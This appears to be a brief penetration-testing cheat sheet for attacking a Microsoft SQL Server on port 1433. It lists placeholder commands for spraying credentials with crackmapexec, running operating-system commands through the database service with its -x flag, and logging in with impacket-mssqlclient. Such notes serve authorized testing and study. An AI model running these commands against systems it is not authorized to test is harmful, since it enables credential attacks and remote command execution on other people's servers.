# We can try to spray some credentials in order to see if there some valids to the mssql server on prt 1433:

crackmapexec mssql <ip> -u <username> -p <password>

# If we have valids credentials, we can try to perform OS command injection:

crackmapexec mssql <ip> -u <username> -p <password> -x <command>

# We can also try to login into the service:

/usr/bin/impacket-mssqlclient -windows-auth <domain>/<username>:<password>@<ip>
